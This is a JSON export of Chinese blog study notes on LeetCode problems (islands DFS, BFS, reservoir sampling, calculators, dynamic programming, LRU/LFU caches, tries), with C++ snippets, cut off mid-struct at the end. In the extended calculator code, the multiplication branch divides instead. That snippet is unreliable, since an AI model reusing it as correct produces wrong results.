[{"title":"labuladong-其他","date":"2022-11-20T08:54:00.000Z","path":"2022/11/20/labuladong-其他/","text":"698.划分为k个相等的子集，1020. 飞地的数量，200. 岛屿数量，1254. 统计封闭岛屿的数目，695. 岛屿的最大面积，1905. 统计子岛屿，752. 打开转盘锁，384. 打乱数组，382. 链表随机节点，398. 随机数索引，268. 丢失的数字，172. 阶乘后的零，204. 计数质数，645. 错误的集合，292. Nim 游戏，319. 灯泡开关，241. 为运算表达式设计优先级，816. 模糊坐标，986. 区间列表的交集，1288. 删除被覆盖区间，659. 分割数组为连续子序列，969. 煎饼排序，43. 字符串相乘，224. 基本计算器，227. 基本计算器 II，42. 接雨水，921. 使括号有效的最少添加，1541. 平衡括号字符串的最少插入次数，855. 考场就座 698. 划分为k个相等的子集划分子集，每个子集的和都要等于一个目标和。可以把子集想象成k个桶，要做的就是把每个数放入适当的桶中。 桶的初始容量为目标和target，遍历每个桶若有桶的容量足够就把当前数放入桶中，然后放下一个数，重复这个流程直到放完所有数，其中某个数找不到合适的桶就返回false。 为了ac还需要一些剪枝技巧：当bucket[i] == bucket[i - 1]，这说明当前桶和上一个桶一样不能放，可以直接返回。 123456789101112for (int i = 0; i &lt; bucket.size(); i++) //把idx试着放入每个桶&#123; //上一个桶放不了，这个桶和上一个桶一样，也放不了 if (i &gt; 0 &amp;&amp; bucket[i] == bucket[i - 1]) continue; if (bucket[i] - nums[idx] &lt; 0) //容量不够 continue; bucket[i] -= nums[idx]; if (backTracking(nums, bucket, idx + 1)) return true; bucket[i] += nums[idx];&#125; 和一般回溯的从数组中选数不同，从桶的角度，把数尝试放入桶中更直观。 1020. 飞地的数量常规dfs，把边界的区域1改为0，然后统计剩下多少个1 dfs模板： 12345678910void dfs(vector&lt;vector&lt;int&gt;&gt; &amp;grid, int i, int j)&#123; if(i &lt; 0 || j &lt; 0 || i &gt;= grid.size() || j &gt;= grid[0].size() || grid[i][j] == 0) return; grid[i][j] = 0; dfs(grid, i + 1, j); dfs(grid, i, j + 1); dfs(grid, i - 1, j); dfs(grid, i, j - 1);&#125; 200. 岛屿数量更常规，遍历到1说明有一个岛，然后dfs把岛填平 1254. 统计封闭岛屿的数目和飞地那题一样，核心是区分边界的陆地和中心的陆地，方法是先把边界的陆地dfs变成水，然后遍历矩阵看剩下的岛的数目或面积 也可以在dfs的过程中区分边界和中心，方法是当遇到边界退出时返回false说明这个不是封闭岛，当遇到水退出是返回true说明这可能是一个封闭岛，最后把四个方向dfs的结果&amp;&amp;一下。 这个方法注意一个坑，不要写成这样： 这会导致短路效应，当dfs判断为false后不再执行后面的dfs，可能导致其他方向的陆地没有改成水。 12return dfs(grid, i + 1, j) &amp;&amp; dfs(grid, i, j + 1) &amp;&amp; dfs(grid, i - 1, j) &amp;&amp; dfs(grid, i, j - 1); 12345bool a = dfs(grid, i + 1, j); bool b = dfs(grid, i, j + 1);bool c = dfs(grid, i - 1, j); bool d = dfs(grid, i, j - 1);return a &amp; b &amp; c &amp; d; 695. 岛屿的最大面积一样的套路，dfs的同时求面积，然后遍历取最大面积 1905. 统计子岛屿和封闭岛屿一样有2种思路。 一是去除不合格的元素，封闭岛屿是把边界的岛dfs一遍，本题当grid1[i] [j] == 0 &amp;&amp; grid2[i] [j] == 1 时grid1无法包围grid2，一定不是子岛屿，所以dfs填平。然后再遍历一遍，统计剩下的岛屿数量。 二是直接在dfs中判断grid2 dfs的过程中若对应位置的grid1不是1，说明无法包围，返回false，遍历到边界就返回true。同样的，为了防止短路效应，4个dfs分开写。 752. 打开转盘锁每次转动可以把每个位置上或下转一次，共8种选择，可以把这个问题抽象成一棵决策树，8个分支。最少转动次数就是决策树到达target的最小树高，这样就可以用bfs解决了，也就是层序遍历。 利用计算每层size的方法分层处理，每处理完一层就使树高res+1。对于每层的处理是将每个位上下转动，得到一种结果存入队列中 若遇到deadends的元素就不能往下转动了，同时用哈希表visited去重，避免重复加入相同的字符串。转到target就直接返回。 1234567891011121314151617181920212223242526int sz = q.size();while(sz--)&#123; string cur = q.front(); q.pop(); if(dead.count(cur)) continue; if(cur == target) return res; for(int i = 0; i &lt; 4; i++) &#123; string up = pushUp(cur, i); if(!visited.count(up)) &#123; q.push(up); visited.insert(up); &#125; string down = pushDown(cur, i); if(!visited.count(down)) &#123; q.push(down); visited.insert(down); &#125; &#125;&#125;res++; 384. 打乱数组打乱一个数组的经典算法：洗牌算法。 长为n的数组共有n!种排列方式，打乱数组的方法也应该有n!种可能。洗牌算法的思路是将一个数和它后面随机的一个数进行交换，对于数组第一个数，包括自己有n个数，即n种可能，对于数组的第二个数，有n-1种…于是打乱整个数组有n!种可能的结果，符合要求。 实现也很简单： 123456int n = nums.size();for(int i = 0; i &lt; n; i++)&#123; int j = i + rand() % (n - i); swap(nums[i], nums[j]);&#125; 382. 链表随机节点链表无法随机存取然后swap，不能再用洗牌算法了，这里用到的是蓄水池算法。 可以证明，为了保证每个节点以1/n概率被选中，只要使选择第i个节点的概率为1/i即可。 rand() % i产生[0, i)的数，随机到0的概率为1/i，若等于0就选取该节点val，这样一次遍历就能实现随机选取。 123456789101112int i = 0;int res = 0;while(cur)&#123; i++; if(0 == rand() % i) //1/i的概率选中cur作为当前值 &#123; res = cur-&gt;val; &#125; cur = cur-&gt;next;&#125;return res; 当然，不要求一次遍历的话先求链表长度，然后rand求一个[0, len)的值，再遍历一次取出即可。 398. 随机数索引1、也是蓄水池算法，找到target就使用，但lc用例过大超时了。 2、土办法，哈希表收集所有索引放到数组中，然后rand一个idx在数组里找 268. 丢失的数字长为n的数组正常放的是[0, n - 1]，出现丢失后放的是[0, n]（缺一个），可见大部分元素都重叠，即有两个，而丢失的数只有一个，想到异或运算。把索引和元素全部异或一下，剩下的就是丢失的数了。 若数组放的就是[0, n - 1]，那么丢失n，所以把res初始化为n 172. 阶乘后的零直接算阶乘肯定不现实，阶乘的0由2和5相乘产生，2可以由偶数分解是不缺的，所以0的数目由因子5的数目决定。 直接除5就能得到5幂次方的数目：5、10、15、…，但注意25、50之类的数含有不止一个因子5，如25可分解为5*5。把这些因子收集起来再除5？其实不用，把除数乘5就行了，也就是接着求因子为25的数，同样再求75… 123456789101112131415class Solution &#123;public: int trailingZeroes(int n) &#123; int cnt = 0; int div = 5; while(div &lt;= n) &#123; cnt += n / div; div *= 5; &#125; return cnt; &#125;&#125;; 204. 计数质数质数只能被1和它本身整除。 计算质数个数可以用质数筛选法：因为质数的倍数一定不是质数，可以用一个bool表记录0-n的数是否为质数，把所有倍数都置为false，剩下的就是质数了 1234567for(int i = 2; i * i &lt;= n; i++) //质数基准&#123; for(int j = i * i; j &lt; n; j += i) //质数倍数一定不是质数 &#123; primes[j] = false; &#125;&#125; 有2处优化：1、质数基准最多取到根号n，因为对称性，16分解成2 8和8 2是一样的，只取前一半也就是根号n就行了。2、j = i i，而不是j = 2 i，因为2可能被其他基准用过了，例如以5为基准，倍数15 = 3 * 5，而3已经作为基准被用过了，所以从不小于5的倍开始。 645. 错误的集合对于这种数组值和索引大部分重合的题目，一是考虑异或，二是考虑建立二者映射。本题可以把元素值变成索引，然后标记一下对应的元素（比如变成负数），如果有重复访问那就是重复的，而没有被标记负数的，它对应的索引就是缺失的。 292. Nim 游戏迫使对方面对4的倍数的石头 319. 灯泡开关灯泡被打开奇数次就会最终亮着，对于第n个灯泡，只有n的第因数轮才能打开它的开关，比如9只有1、3轮。9盏灯就是1 1， 2 2， 3 * 3共3盏灯亮着，故开平方。 241. 为运算表达式设计优先级分治，把表达式按照符号分隔成不同区间，(…) * (…)求出两个区间的结果然后每个值做乘法就得到该大区间的结果，而求小区间又向下递归…直到某个区间找不到运算符，直接返回数字。 123456789101112131415161718192021for(int i = 0; i &lt; expression.size(); i++) //遍历表达式，找运算符号&#123; char c = expression[i]; if(c == '+' || c == '-' || c == '*') &#123; vector&lt;int&gt; left = diffWaysToCompute(expression.substr(0, i)); //前半区的结果 vector&lt;int&gt; right = diffWaysToCompute(expression.substr(i + 1));//后半区的结果 for(auto &amp;a : left) //根据符号对两个半区做运算 &#123; for(auto &amp;b : right) &#123; if(c == '+') res.push_back(a + b); else if(c == '-') res.push_back(a - b); else res.push_back(a * b); &#125; &#125; &#125;&#125; 816. 模糊坐标刚好每日一题也是分治法，和上题挺像，需要把大区间划分为小区间处理。 本题添加小数点是比较麻烦的，需要考虑0的情况，而添加逗号可以在0以外的位置直接添加，只要两侧有符合条件的数即可。所以大体框架是遍历字符串在从1开始的每个位置添加逗号，然后划分左右区间看它们添加小数点的情况，若都不为空就组合起来。 12345678910111213141516for(int i = 1; i &lt; s.size(); i++) //枚举插入逗号的位置&#123; vector&lt;string&gt; left = addPoint(s.substr(0, i)); //左区间加小数点的所有结果 if(left.empty()) continue; vector&lt;string&gt; right = addPoint(s.substr(i)); //右区间加小数点的所有结果 if(right.empty()) continue; for(auto &amp;a : left) //遍历然后组合起来 &#123; for(auto &amp;b : right) &#123; res.push_back(\"(\" + a + \", \" + b + \")\"); &#125; &#125;&#125; 可以看到和上一题的分治框架是一样的 986. 区间列表的交集归并的思想，选取两个区间，算出最大左边界和最小右边界就是交集。如何选取区间？当first[i]的右边界 &lt;= second[j]的右边界时说明first[i]已经不能和下一个second相交了，此时i++移到下一个区间，反之j++。 1288. 删除被覆盖区间第一想法是，终点升序排序，保证后面的区间能覆盖前面的，然后看符合的起点有多少个，这样需要两层for。其实一个区间只需要被一个其他区间覆盖就可以了。 按终点降序排列，保证后面的区间被前面的区间覆盖，然后看起点，只要大于上一个最大起点就可以被覆盖，否则把当前起点作为新的最大起点。 1234567891011for(int i = 1; i &lt; n; i++)&#123; if(intervals[i][0] &gt;= beg) //比之前最小的起点大，能覆盖 &#123; cnt++; &#125; else //比之前的起点小，不能覆盖，重新选起点 &#123; beg = intervals[i][0]; &#125;&#125; 659. 分割数组为连续子序列对于一个元素它有两种选择：1、接到之前序列的后面，2、作为新序列的开头 因为后面的序列不一定有3个，但前面的序列是一定满足条件的，依据贪心策略优先接到前面的序列。为了统计每种元素的使用情况需要一个哈希表记录频次，另外还需要一个哈希表统计需求情况。 当需求大于0时，说明可以接到前面的序列，该元素频次-1然后需要下一个元素 当连续3个元素频次都大于1，说明可以建立一个新序列，三者频次分别-1，然后需要下一个元素。 1234567891011121314151617181920for(auto &amp;n : nums)&#123; if(freq[n] == 0) //已经被用完了，跳过 continue; if(need[n] &gt; 0) //可以接到之前的某个序列 &#123; freq[n]--; //接上去 need[n]--; need[n + 1]++; //需要n+1 &#125; else if(freq[n] &gt; 0 &amp;&amp; freq[n + 1] &gt; 0 &amp;&amp; freq[n + 2] &gt; 0) //连续3个元素都存在 &#123; freq[n]--; //取走 freq[n + 1]--; freq[n + 2]--; need[n + 3]++; //需要第四个 &#125; else return false;&#125; 969. 煎饼排序思路很直观，要把最大值移动数组后面怎么做？1、通过反转把它移到数组头部，2、通过反转把它移到数组尾部。 看代码一目了然： 12345678910111213141516171819int n = arr.size();while(n &gt; 1) //剩余要排序的数&#123; int max_num = 0; int max_idx = -1; for(int i = 0; i &lt; n; i++) //求剩余数的最大值和索引 &#123; if(arr[i] &gt; max_num) &#123; max_num = arr[i]; max_idx = i; &#125; &#125; reverse(arr, 0, max_idx); //把最大值反转到最左边 reverse(arr, 0, n - 1); //把最大值反转到最右边 res.push_back(max_idx + 1); //记录两次反转的索引（题目从1开始，索引加1） res.push_back(n); n--;&#125; 43. 字符串相乘模拟乘法的过程，具体看labuladong的题解吧，没图不好讲。 重要的一点是num1的第i位和nums2的第j位相乘结果是res的第i + j位和i + j + 1位，有了这个确定关系后就能把每次相乘的结果放到恰当位置了。 224. 基本计算器模拟加减法计算器。计算的核心是符号，若一个数前面的符号为正就加上它，为负就减去它。如果没有括号直接模拟即可，但括号的出现改变了优先级，可以把括号当作一种区域划分，用一个栈保存该区域的基础符号（括号前的那个），然后在区域内修改符号。 当遇到左括号时，压入当前符号作为基础符号，当遇到右括号就弹出回到原本的区域 当遇到加号时就把当前符号设置为基础符号（栈顶），遇到负号就把基础符号取反 直到遇到数字开始进行数值计算 1234567891011121314151617181920else if(s[i] == '+')&#123; sign = st.top(); i++;&#125;else if(s[i] == '-')&#123; sign = -st.top(); i++;&#125;else if(s[i] == '(')&#123; st.push(sign); i++;&#125;else if(s[i] == ')')&#123; st.pop(); i++;&#125; 227. 基本计算器 II没有括号了，直接模拟。 用sign记录符号，遇到数值就计算数值，遇到符号就修正之前得到的数值，然后压入栈里（数值栈），因为有乘除法，且优先级更高，所以不能直接累加到res中，应该存到栈里看下一个符号是否是乘除法。 123456789101112131415161718if(isDigit(c))&#123; num = num * 10 + (c - '0');&#125;if((!isDigit(c) &amp;&amp; c != ' ') || (i == s.size() - 1))&#123; if(sign == '+') st.push(num); else if(sign == '-') st.push(-num); else if(sign == '*') st.top() *= num; else if(sign == '/') st.top() /= num; sign = c; num = 0;&#125; 如果同时有加减乘除和括号呢？代码如下，基本是上一题的框架，同时利用递归处理括号内的情况，为了从前端弹出元素，使用了双端队列。注意右括号的判断要放到最后，以免没完成入栈就break了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class Solution &#123;public: int calculate(string s) &#123; deque&lt;char&gt; str(s.begin(), s.end()); return helper(str); &#125;private: int helper(deque&lt;char&gt; &amp;s) &#123; int num = 0; char sign = '+'; stack&lt;int&gt; st; while(!s.empty()) &#123; char c = s.front(); s.pop_front(); if(c == '(') &#123; num = helper(s); &#125; if(isDigit(c)) &#123; num = num * 10 + (c - '0'); &#125; if((!isDigit(c) &amp;&amp; c != ' ') || s.empty()) &#123; if(sign == '+') &#123; st.push(num); &#125; else if(sign == '-') &#123; st.push(-num); &#125; else if(sign == '*') &#123; st.top() /= num; &#125; else if(sign == '/') &#123; st.top() /= num; &#125; num = 0; sign = c; &#125; if(c == ')') &#123; break; &#125; &#125; int res = 0; while(!st.empty()) &#123; res += st.top(); st.pop(); &#125; return res; &#125; bool isDigit(char c) &#123; if(c &gt;= '0' &amp;&amp; c &lt;= '9') return true; else return false; &#125;&#125;; 42. 接雨水首先要明确的是接雨水按列求解更方便，否则同时考虑高和宽非常麻烦。按列求解固定了宽为1，只需计算高度即可。 一个柱子的雨水高度取决于左区间最大值和右区间最大值，由木桶效应，二者的最小值就是本柱子雨水能达到的最大高度。一个直观的方法是求出每个元素左边的最大值和右边的最大值用两个数组存起来，这能使时间降为N，但需要额外空间。 最好的优化是双指针，left = 0， right = n - 1，二者往中间靠的同时求0到left的最大值l_max和j到n的最大值r_max，若l_max &lt; r_max，那么我们确定left处的高度了，因为知道了左侧最大值小于右侧的r_max，虽然r_max不是右侧最大值，但由于木桶效应只需要知道两侧最大值中小的那个就可以了，而left到right之间的最大值无需考虑。 同理，若r_max &lt; l_max就可以确定right处的高度由r_max决定 123456789101112131415while(i &lt; j)&#123; l_max = max(l_max, height[i]); //0-i的最大值 r_max = max(r_max, height[j]); //j-n的最大值 if(l_max &lt; r_max) //可以确定i处的值了，因为知道左侧最大值比右侧小 &#123; res += l_max - height[i]; i++; &#125; else &#123; res += r_max - height[j]; j--; &#125;&#125; 921. 使括号有效的最少添加括号匹配一般用栈解决辅助，但也可以用变量left和right记录左右括号的数目，括号匹配的原则是右括号主动匹配左括号，所以遇到左括号就使left+1，遇到右括号就使left-1，当left&lt;0时说明左括号匹配完了，此时right+1。最终left和right的总数就是无法匹配的括号数。 1541. 平衡括号字符串的最少插入次数和上题有两点不同：1、右括号匹配掉一个左括号后其实还需要一个右括号，因此need=1而不是0,；2、每次遇到左括号need+2，若need为奇数（need=1导致），插入一个右括号，需求-1 123456789101112131415161718192021for(auto &amp;c : s)&#123; if(c == '(') &#123; need += 2; //每次遇到一个左括号需要2个右括号 if(need &amp; 1) //需要的右括号为奇数，不合理 &#123; give++; //加入一个右括号 need--; //需求减1 &#125; &#125; else &#123; need--; if(need &lt; 0) &#123; give++; need = 1; //添加一个右括号后还需要1个 &#125; &#125;&#125; 855. 考场就座就是找距离最长的线段，问题是用什么数据结构储存这些端点以便快速查找。为了使端点升序排列，应该使用自动排序的数据结构，选择set。 遍历set，每次的值和pre求距离，若当前距离是max那么二者中点就是结果。但注意最后一个节点，例如10个座位，已坐了[0, 2, 4]，上面的遍历只计算了0-2,2-4的距离，而最后一位座位9没有考虑，因此完成遍历后还需进行判断 （pre初始化为begin而不是0，因为0号可能离开不是初始值） 12345678910111213141516int pre = *s.begin();int max = pre;int res = 0;for(auto &amp;it : s)&#123; int cur = (it - pre) / 2; if(cur &gt; max) &#123; max = cur; res = (it + pre) / 2; &#125; pre = it;&#125;if(n - 1 - pre &gt; max) res = n - 1;s.insert(res);","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"labuladong-动态规划","date":"2022-10-29T02:24:10.000Z","path":"2022/10/29/labuladong-动态规划/","text":"354.俄罗斯套娃信封问题，931. 下降路径最小和，712. 两个字符串的最小ASCII删除和，174. 地下城游戏，787. K 站中转内最便宜的航班，486. 预测赢家，877. 石子游戏，1024. 视频拼接 354. 俄罗斯套娃信封问题二维的最长递增子序列问题。先按宽升序排序，这样就能保证后面的信封能容纳前面的信封，只考虑第二个维度即可。但是同样大小的信封不能套娃，例如[2,1]和[2,3]，所以当宽相同时再让高降序排序，这样[2,3]在[2,1]前面就不会考虑到套娃了。 但是又有问题，原版最长递增子序列的复杂度为O(N^2)，有一个样例超时了，这里要考虑把里层的线性查找for改为二分查找。 用一个dp数组存储最长递增子序列，若当前的高大于之前子序列的最大值（也就是dp.back())，那么把该值添加到dp最后，否则用二分查找到dp中第一个小于等于cur的数，把cur放在这，保持dp是一个严格递增子序列。 12345678910111213for(int i = 1; i &lt; envelopes.size(); i++)&#123; int cur = envelopes[i][1]; if(cur &gt; dp.back()) &#123; dp.push_back(cur); &#125; else &#123; int idx = getIndex(dp, cur);//二分查找 dp[idx] = cur; &#125;&#125; 931. 下降路径最小和很明显的dp，每个中间格的最小路径取决于上面3个格子 可以直接用matrix当dp数组，不想破坏数据的话用一个一维的dp保存每行的结果，因为每行只依赖于上一行。 712. 两个字符串的最小ASCII删除和和“两个字符串的删除”相似，从最小步骤数改为了ascii和，直接套它的代码，dp意义变了，要改两处地方。 第一个是初始化，dp[i] [0]表示长为i的s1转化为空串，它需要把s1全删了，所以dp[i] [0] = s1[0]到s1[i]的ascii和 用tmp求累和，dp[0] [0]留空 12345for(int i = 0; i &lt; n; i++)&#123; tmp += s1[i]; dp[i + 1][0] = tmp;&#125; 第二个是dp更新，从加步骤数变成加ascii值 1dp[i][j] = min(&#123;dp[i - 1][j - 1] + s1[i - 1] + s2[j - 1], dp[i - 1][j] + s1[i - 1], dp[i][j - 1] + s2[j - 1]&#125;); 174. 地下城游戏初看和最短路径和很像，但这里求的是路径中的损耗，也就是要保证到达终点的同时求最少损耗。这里有两处限制，常规的dp无法解决，为了保证一定能到终点，可以从终点开始反向dp 这里dp[i] [j]的含义是从[i, j]到终点的最少损耗，显然dp[i] [j] 取决于两个值，即dp[i + 1] [j] 和 dp[i] [j + 1]，要求损耗最少，取其中最小值，通过计算：min(dp[i + 1] [j], dp[i] [j + 1]) - dungeon[i] [j] 就能求出从[i, j]到终点的最少损耗了。但还没完，可能出现体力过剩的情况，如 dungeon[i] [j] 值较大，比后续损耗还大，那么久不需要那么多体力，把体力设置为1保证能活下来就行 综上，dp过程为： 123456789101112vector&lt;vector&lt;int&gt;&gt; dp(m + 1, vector&lt;int&gt;(n + 1, INT_MAX));//初始假设需要无线体力dp[m - 1][n] = 1;dp[m][n - 1] = 1;for(int i = m - 1; i &gt;= 0; i--) //反向dp&#123; for(int j = n - 1; j &gt;= 0; j--) &#123; //先找右或下哪个需要的体力最少，减去dungeon[i, j]就是[i, j]到终点需要的最少体力 //若该体力小于1说明体力充足，把它设定为1保证不死就行 dp[i][j] = max(min(dp[i + 1][j], dp[i][j + 1]) - dungeon[i][j], 1); &#125;&#125; 787. K 站中转内最便宜的航班一开始想到dijksra，但成环形时中转次数不好确定，然后看一下dfs回溯的写法，但超时。 这里既要最短距离，又要k次中转，两重要求无法兼顾，考虑上题先固定一端。同样从后往前遍历，搜索到确定终点的最少花费起点。 dp[i] [j]意义为第i轮中转，到达终点j的最少花费，它和能到达j的起点有关： dp[i] [f[1]] = min(dp[i] [f[1]], dp[i - 1] [f[0]] + f[2])，f0、1、2分别表示起点、终点、花费。这样进行k+1轮的更新，再从dp[] [dst]里找最小值。 123456789for(int i = 1; i &lt;= k + 1; i++) //中转次数&#123; for(auto &amp;f : flights) &#123; if(dp[i - 1][f[0]] == INT_MAX) //起点到不了，终点也到不了 continue; dp[i][f[1]] = min(dp[i][f[1]], dp[i - 1][f[0]] + f[2]); &#125;&#125; 486. 预测赢家新题型，博弈相关的问题，轮流选择求最大收益。 从首尾两端选择所以每次选择的状态取决于选择左端或选择右端两种情况。设dp[i]表示以i为结尾的最大收益，这里的收益是考虑机会成本的，即选了一端就失去了另一端的收益，设左端为i，右端为j 若选择左端nums[i]，那么收益是nums[i] - dp[j]，因为j的选择权交给另一方了 若选择右端nums[j]，那么收益是nums[j] - dp[j - 1] 123456789for(int i = n - 2; i &gt;= 0; i--) //左端点&#123; for(int j = i + 1; j &lt; n; j++) //右端点 &#123; //选左端点，那以j为右端点的最大收益dp[j]就拿不到了 //选右端点，那以j - 1为右端点的最大收益dp[j - 1]就拿不到了 dp[j] = max(nums[i] - dp[j], nums[j] - dp[j - 1]); &#125;&#125; 将dp[i]初始化为nums[i]，表示起始就能拿到nums[i]本身 最后dp[n - 1] &gt;= 0说明总收益非负，赢了 877. 石子游戏和上题一模一样 1024. 视频拼接区间重叠问题，但不是求重叠的区间数而是最少需要的区间 这里有点类似跳跃游戏，尽可能地拓展其cover，但这题的扩展有限制即起点不能超过原区间的终点，保证重叠的情况下扩展cover。 123456789101112while(i &lt; n &amp;&amp; clips[i][0] &lt;= end)&#123; while(i &lt; n &amp;&amp; clips[i][0] &lt;= end) //在重叠区间中更新最大右边界 &#123; cover = max(cover, clips[i][1]); i++; &#125; res++; end = cover; if(end &gt;= time) return res;&#125;","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"labuladong-设计","date":"2022-10-11T04:28:22.000Z","path":"2022/10/11/labuladong-设计/","text":"146.LRU 缓存，460. LFU 缓存，208. 实现 Trie (前缀树)，648. 单词替换，677. 键值映射，295. 数据流的中位数，496. 下一个更大元素 I，739. 每日温度，503. 下一个更大元素 II，355. 设计推特 146. LRU 缓存首先想到的是给每个cache块附加一个时间戳stamp，每次读写就更新stamp，cache已满则根据stamp的值选择要替换的块。但这种方法每次更新和选取都要遍历cache，无法达到O(1)的复杂度 为了实现O(1)的存取，肯定是要哈希表的，但单纯的哈希表不能实现LRU的功能。这里需要一种新的数据结构—哈希链表。 链表的节点由key和value组成，用于存放数据，每次用完一个块后就把该节点移到链表头，这样链表尾的节点就是最近最少使用的了，可用于lru替换，哈希表根据key映射以O(1)的时间找到对应的节点。 还有一个问题是把节点移动到链表头时需要找到它的前驱节点，否则会断链，如何才能以O(1)的复杂度找到前驱？需要使用双向链表。 12345678910111213141516171819202122232425262728293031323334int get(int key) &#123; if(cache.count(key)) &#123; DListNode *node = cache[key]; moveToHead(node); return node-&gt;value; &#125; return -1;&#125;void put(int key, int value) &#123; if(cache.count(key)) &#123; DListNode *node = cache[key]; node-&gt;value = value; moveToHead(node); &#125; else &#123; DListNode *node = new DListNode(key, value); addToHead(node); cache[key] = node; size++; if(size &gt; cap) &#123; DListNode *dnode = deleteTail(); cache.erase(dnode-&gt;key); delete dnode; size--; &#125; &#125;&#125; 需要手写双向链表的几个基本操作（都不难），同时为了避免边界讨论要使用哑节点。从上面可以看到，每次找key都是通过哈希表cache直接找对应的节点，处理完成后要把该节点移至链表头，如果长度超过capacity就删除尾部节点。 460. LFU 缓存这题更是重量级，不仅要统计频率，还要区分同频率时的先后顺序。由上一题知利用哈希链表可以区分先后顺序，而此题需要在同一频率之下进行这一步，也就是说每个频率都需要一个链表，即频率-链表的映射关系，同时为了以O(1)的时间找到每个节点，还需要一个key-节点的映射，故本题需要2个哈希表。 首先在每个节点的结构体中加入一个freq属性，每次操作完一个节点就使其freq++，同时记录一个min_freq标记最少使用。get比较简单，直接根据key值就能找到需要的节点，然后将它freq+1，移动到对应频率的链表头部。 put分情况，若已经有key对应的节点，和get类似修改其value，然后freq+1放入对应频率的链表头部。 若没有key对应的节点且有容量，构造新节点，freq设为1，放入对应频率的链表头部，同时也要放入key-节点的哈希表中。 若没有key对应的节点且容量已满，找到min_freq的链表，删除尾部节点（在key-节点的哈希表也要删除），然后再进行上面的插入步骤。 思路不难但代码细节较多，还需多看。 208. 实现 Trie (前缀树)trie是二叉树的拓展，用于字符串的搜索。 1、首先它是多叉的，比如小写字母有26个，那么每个节点应该有26个子节点 2、为了区分字符串和字符串的前缀，需要一个bool字段判断当前节点是否是某个字符串的结尾 TrieNode可以声明为一下形式： 123456struct TrieNode&#123; bool end; vector&lt;TrieNode*&gt; children; TrieNode() : end(false), children(26, nullptr) &#123;&#125;&#125;; 二叉树最重要的操作是遍历，例如BST根据节点值的大小向不同子节点移动，最后找到目标节点。Trie的思路类似，不过它不是比值大小，而是把子节点代表的字符和字符串进行匹配，以此确定移动方向。 首先需要一个空的根节点作为每次搜索的起点，然后开始遍历，看字符串的当前字符c是否在cur的子节点中，有则把cur移动到该子节点，然后重复这个步骤。根据end可以区分搜索字符串和前缀。 123456789101112bool search(string word)&#123; TrieNode *cur = root; for(auto &amp;c : word) &#123; if(cur-&gt;children[c - 'a'] == nullptr) return false; cur = cur-&gt;children[c - 'a']; &#125; return cur-&gt;end == true; //搜索字符串 // return true; //搜索前缀&#125; 插入操作和搜索的原理一样，遇到空节点就new一个，完成所有字符的遍历后把最后一个节点标记为end。 648. 单词替换找最短字符串前缀，有了上一题的基础就很好写。先把dic里的前缀放入trie里面，然后分割sen的单词，在trie中搜索这个单词，由于是长的单词匹配短的前缀（和上题的search相反）所以要修改一下 在搜索的过程中，只有完全匹配了字典树中的前缀才能进行替换，因此要多做一个判断，如果是到达了end导致的退出，即完全匹配前缀则返回匹配的长度，否则返回0说明没找到前缀。 在主函数中依据返回值就可以选择加入原单词还是前缀了 1234567891011for(auto &amp;c : word)&#123; if(cur-&gt;children[c - 'a'] == nullptr || cur-&gt;end) break; cur = cur-&gt;children[c - 'a']; len++; &#125;if(cur-&gt;end) return len;else return 0; 677. 键值映射关于字符串前缀又想到字典树trie，本题要求累加值，所以我们把之前的bool型end改为数字val，val=0说明不是尾节点。 insert函数和之前一样，最后end=true改为了记录val值。 sum函数需要先在trie树中找到前缀，也就是之前search函数的搜索方法，若过程中判断到空节点说明该前缀不存在，直接返回0，否则我们就能移动到前缀的尾节点了。 接着我们要找以该前缀为前缀的字符串，类似dfs的方法，以尾节点为起点，向下找非空的children，加上其值，然后不断向下累加val： 1234567891011void dfs(TrieNode *root, int &amp;res)&#123; for(auto &amp;c : root-&gt;children) &#123; if(c != nullptr) &#123; res += c-&gt;val; //加上val，即使不是尾节点也无所谓，因为非尾节点val=0 dfs(c, res); &#125; &#125;&#125; 295. 数据流的中位数1、大小根堆组合的解法，维护小根堆size - 大根堆size = 0 || 1，也就是大小相等时插入到小根堆，不等时插入到大根堆。这里的插入需要先放到另一个堆过滤一遍再插入。返回中位数也根据两个堆的大小判断。 2、也可以双指针的方法，思路更直观。维护left和right指向中位数，用multiset类型的arr保存元素并使之有序。根据arr长度的奇偶来更新left、right 123456789101112131415161718192021222324if(len % 2 == 1) //原本是奇数个元素&#123; if(num &gt;= *right) right++; else left--;&#125;else //原本是偶数个元素&#123; if(num &gt; *left &amp;&amp; num &lt; *right) &#123; left++; right--; &#125; else if(num &gt;= *right) &#123; left++; &#125; else &#123; right--; left = right;//当num=*left时插入到left右边，left也需移动到right的位置 &#125;&#125; 法1好写，法2比较多细节 496. 下一个更大元素 I可以两层for暴力，更好的方法是单调栈 因为nums1是nums2的子集，先根据nums2生成一张哈希表，然后nums1查表，这样避免了从nums1到nums2的定位。 单调栈如何使用呢？为了找后面更大的元素，应该从后往前处理nums2，用一个栈保存后面元素，并使它们自顶向下顺序排列，这样栈顶就是后面元素中最小的一个。 直接看代码更清晰： 123456789for(int i = nums2.size() - 1; i &gt;= 0; i--) &#123; while(!s.empty() &amp;&amp; s.top() &lt;= nums2[i]) //维护单调栈 &#123; s.pop(); &#125; hash[nums2[i]] = s.empty() ? -1 : s.top(); s.push(nums2[i]); &#125; 739. 每日温度只有一个数组，比上题还简单。套上题模板，这里要求的是索引差值，所以要存索引，一开始想的是把值和索引一起做成pair一起存了，其实不用。 直接存索引，依据nums[s.top()] &lt;= nums[i]来维护栈就可以了，求什么存什么，反正数组元素可以通过索引随机存取的。 503. 下一个更大元素 II出现了环形数组，打家劫舍对环形数组有拆分成两个队列的方法，这题显然不适用。 既然要同时考虑一个元素前后的其他元素，而单调栈只能处理后面的元素，那么不如把前面的元素移到后面，也就是说把数组整体在后面复制一份。开一个新数组？其实不需要，这里的翻倍数组只需要逻辑上的翻倍，因为前后两部分是一样的。 直接从2n - 1（翻倍后的数组长度）开始遍历，当需要用索引取元素的时候，就用取模的方式得到真实索引：nums[i % n]，其他部分还是套模板 以上三题都是单调栈的应用，可以看出类型比较单一，就是求某元素的下一个最大元素。 355. 设计推特基于OO思想的设计，不只是设计某种数据结构。可以把用户抽象为一个类，它包含自己的id，关注者和发的推特，由于后续需要比较发推特的时间，我们在tweets附加一个全局的stamp字段： 12345678910struct User //存储每个用户的信息&#123; int userId; vector&lt;pair&lt;int, int&gt;&gt; tweets; //存储发的推特id和对应的时间戳 